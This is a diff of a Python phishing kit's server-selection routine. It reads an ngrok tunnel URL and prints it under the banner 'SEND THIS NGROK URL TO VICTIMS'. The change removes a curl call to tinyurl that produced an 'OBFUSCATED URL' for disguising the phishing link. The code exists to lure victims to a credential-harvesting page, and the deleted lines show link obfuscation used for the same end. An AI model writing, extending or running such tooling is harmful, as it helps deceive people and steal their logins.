@@ -173,15 +173,9 @@ def selectServer(port): #Question where user must select server
                 urlFile = open('ngrok.url', 'r')
                 url = urlFile.read()
                 urlFile.close()
-		system("curl -o tinyurlsource.txt -s 'http://tinyurl.com/create.php?url='"+url)
-                system("""grep success -F tinyurlsource.txt | cut -d'"' -f6 > tinyurl.txt """)
-                urlFile = open('tinyurl.txt', 'r')
-                tinyurl = urlFile.read()
-                urlFile.close()
                 if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
                     print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
-		    print("{0}[{1}*{0}]{1} OBFUSCATED URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + tinyurl + "{1}".format(MAIN0, MAIN4, MAIN3))
-		    print("\n")  
+                    print("\n")  
                     break
 
         elif choice == '2':
